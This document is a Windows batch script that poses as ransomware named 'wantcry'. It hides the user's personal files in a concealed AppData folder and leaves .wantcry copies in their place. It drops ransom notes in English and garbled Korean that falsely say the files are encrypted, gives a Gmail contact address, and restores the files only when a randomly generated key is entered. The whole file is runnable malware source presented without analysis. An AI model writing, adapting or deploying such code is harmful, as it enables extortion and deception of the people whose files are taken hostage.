@echo off 
color 47 
title don`t exit 
timeout /t 10 
title �� â�� �������� ���ÿ� 
del %userprofile%\Desktop\*.wantcry* >nul 2>&1
del %userprofile%\pictures\*.wantcry* >nul 2>&1
del %userprofile%\videos\*.wantcry* >nul 2>&1
del %userprofile%\documents\*.wantcry* >nul 2>&1
del %userprofile%\downloads\*.wantcry* >nul 2>&1
md %userprofile%\AppData\syswindows\ >nul 2>&1
md %userprofile%\AppData\syswindows\desk >nul 2>&1
md %userprofile%\AppData\syswindows\pic >nul 2>&1
md %userprofile%\AppData\syswindows\video >nul 2>&1
md %userprofile%\AppData\syswindows\doc >nul 2>&1
md %userprofile%\AppData\syswindows\down >nul 2>&1
move %userprofile%\Desktop\*.* %userprofile%\AppData\syswindows\desk\
copy %userprofile%\AppData\syswindows\desk\*.* %userprofile%\Desktop\*.wantcry*
move %userprofile%\pictures\*.* %userprofile%\AppData\syswindows\pic\
copy %userprofile%\AppData\syswindows\pic\*.* %userprofile%\pictures\*.wantcry*
move %userprofile%\videos\*.* %userprofile%\AppData\syswindows\video\
copy %userprofile%\AppData\syswindows\video\*.* %userprofile%\videos\*.wantcry*
move %userprofile%\Documents\*.* %userprofile%\AppData\syswindows\doc\
copy %userprofile%\AppData\syswindows\doc\*.* %userprofile%\Documents\*.wantcry*
move %userprofile%\downloads\*.* %userprofile%\AppData\syswindows\down\
copy %userprofile%\AppData\syswindows\down\*.* %userprofile%\downloads\*.wantcry* 
set /a pass=%random% %% 9999+1000
set /a pass2=%random% %% 9999+1000
set /a pass3=%random% %% 9999+1000
set /a pass4=%random% %% 999999+100000
echo %pass%-%pass2%-%pass3%-%pass4% >> %userprofile%\Documents\syslog.wantcry
echo your computer all files is encrypted >> %userprofile%\Desktop\readmeusa.txt 
echo ����� ��ǻ�Ϳ� �ִ� ��� ������ ��ȣȭ�Ǿ����ϴ� >> %userprofile%\Desktop\readmekr.txt 
title wantcry �������� 
:wow
cls
echo wantcry ��������
echo -----------------------------------------------------------               
echo �� ������ ��� �Ǿ����ϱ�? 
echo ����� ������ �츮 ����Ʈ����� ��ȣ������ ������            
echo ������ �Ҷ����� ������ ����Ҽ� �����ϴ� 
echo -----------------------------------------------------------
echo ��� �����մϱ�? 
echo ������ �Ϸ��� ���� ���α׷��� �ʿ��մϴ� 
echo ���� ���α׷��� ��� ����� �����ϴ�
echo codewantcrydecrepter@gmail.com ���� �����Ͻʽÿ�
echo -----------------------------------------------------------
echo ���� ��ǻ�͸� �ٽý����Ѵٸ� ������ص� �ҿ�����̴ϴ� 
echo ���� wantcry ������� ������ ��� ������ �������� ������ �Դϴ�.  
echo ���࿡ ����Ű�� ������ �ִٸ� �Ʒ� â���� �Է��Ͻʽÿ�
echo ----------------------------------------------------------- 
set /p password=�Է�:
if %password% == %pass%-%pass2%-%pass3%-%pass4% goto pass
cls 
echo ��ȣ�� �ٸ��ϴ� 
pause 
goto wow 
 
:pass 
cls
echo ������...
echo ���� �� â�� ���� ���ʽÿ�. 
timeout/t 5 /nobreak >nul
del %userprofile%\Desktop\*.wantcry*
move %userprofile%\AppData\syswindows\desk\*.* %userprofile%\Desktop\
del %userprofile%\pictures\*.wantcry*
move %userprofile%\AppData\syswindows\pic\*.* %userprofile%\pictures\
del %userprofile%\videos\*.wantcry*
move %userprofile%\AppData\syswindows\video\*.* %userprofile%\videos\
del %userprofile%\documents\*.wantcry*
move %userprofile%\AppData\syswindows\doc\*.* %userprofile%\documents\
del %userprofile%\downloads\*.wantcry*
move %userprofile%\AppData\syswindows\down\*.* %userprofile%\downloads\ 
del %userprofile%\Desktop\*readmekr.txt* 
del %userprofile%\Desktop\*readmeusa.txt*
cls
del %userprofile%\documents\*syslog.wantcry*
rmdir /s /q "%userprofile%\AppData\syswindows"
cls
exit